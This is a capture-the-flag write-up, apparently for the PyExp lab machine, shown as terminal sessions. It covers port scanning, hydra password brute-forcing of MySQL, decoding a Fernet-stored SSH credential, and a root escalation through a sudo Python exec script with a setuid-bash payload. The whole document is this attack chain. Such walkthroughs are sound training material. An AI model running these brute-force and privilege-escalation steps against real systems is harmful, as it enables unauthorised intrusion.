
```console
root@kali:/OSCPv3/offsec/PyExp# nmap -Pn -sT -n 192.168.58.118  -p- --min-rate 1000 --max-retries 2 --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-11 21:02 CDT
Warning: 192.168.58.118 giving up on port because retransmission cap hit (2).
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 96.61% done; ETC: 21:04 (0:00:02 remaining)
Nmap scan report for 192.168.58.118
Host is up, received user-set (0.11s latency).
Not shown: 64759 closed ports, 774 filtered ports
Reason: 64759 conn-refused and 774 no-responses
PORT     STATE SERVICE REASON
1337/tcp open  waste   syn-ack
3306/tcp open  mysql   syn-ack

Nmap done: 1 IP address (1 host up) scanned in 77.94 seconds
```

```console
root@kali:/OSCPv3/offsec/PyExp# nmap -Pn -sT -sV -n 192.168.58.118 -p 1337,3306 --min-rate 1000  --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-11 21:07 CDT
Nmap scan report for 192.168.58.118
Host is up, received user-set (0.11s latency).

PORT     STATE SERVICE REASON  VERSION
1337/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
3306/tcp open  mysql   syn-ack MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
```

```console
root@kali:/OSCPv3/offsec/PyExp/cve-2016-6662# hydra -f -T 120 -t 120 -l root -P /usr/share/wordlists/rockyou.txt 192.168.58.118 mysql -v -V
...
[VERBOSE] using default db 'mysql'
[ATTEMPT] target 192.168.58.118 - login "root" - pass "princess101" - 9988 of 0 [child 14344399] (0/2)
[ATTEMPT] target 192.168.58.118 - login "root" - pass "prettywoman" - 9989 of 0 [child 14344399] (0/0)
[ATTEMPT] target 192.168.58.118 - login "root" - pass "piggies" - 9990 of 0 [child 14344399] (0/1)
[ATTEMPT] target 192.168.58.118 - login "root" - pass "packers1" - 9991 of 0 [child 14344399] (0/3)
[VERBOSE] using default db 'mysql'
[VERBOSE] using default db 'mysql'
[VERBOSE] using default db 'mysql'
[VERBOSE] using default db 'mysql'
[3306][mysql] host: 192.168.58.118   login: root   password: prettywoman
[STATUS] attack finished for 192.168.58.118 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-10-11 23:21:17
```

```console
root@kali:/OSCPv3/offsec/PyExp# mysql -h 192.168.58.118 -u root -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 33512
Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| data               |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.12 sec)

MariaDB [(none)]> 

MariaDB [(none)]> use data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| fernet         |
+----------------+
1 row in set (0.12 sec)

MariaDB [data]> select * from fernet;
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
1 row in set (0.12 sec)

```



https://asecuritysite.com/encryption/ferdecode
lucy:wJ9`"Lemdv9[FEw-

```console
root@kali:/OSCPv3/offsec/PyExp/cve-2016-6662# ssh lucy@192.168.58.118 -p 1337
lucy@192.168.58.118's password: 
Linux pyexp 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
lucy@pyexp:~$ whoami
lucy
```


```console
lucy@pyexp:~$ sudo -l
Matching Defaults entries for lucy on pyexp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
lucy@pyexp:~$ ls -la /opt/exp.py 
-rw-r--r-- 1 root root 49 Aug 10  2020 /opt/exp.py
lucy@pyexp:~$ more /opt/exp.py 
uinput = raw_input('how are you?')
exec(uinput)
```

https://www.geeksforgeeks.org/exec-in-python/

```console
lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py 
how are you?import os;os.system('whoami')
root
lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py 
how are you?import os;os.system('chmod u+s /bin/bash')
lucy@pyexp:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
lucy@pyexp:~$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# 
```
```console
bash-5.0# cat user.txt 
Your flag is in another file...
bash-5.0# pwd
/home/lucy
bash-5.0# cat local.txt 
7616b643bd382514207a72e6f3ed256c
bash-5.0#
```

```console
bash-5.0# cd /root
bash-5.0# ls
proof.txt  root.txt
bash-5.0# cat root.txt 
Your flag is in another file...
bash-5.0# cat proof.txt 
230f0021d33aca8bec4af5764baf0cc6
bash-5.0#
```
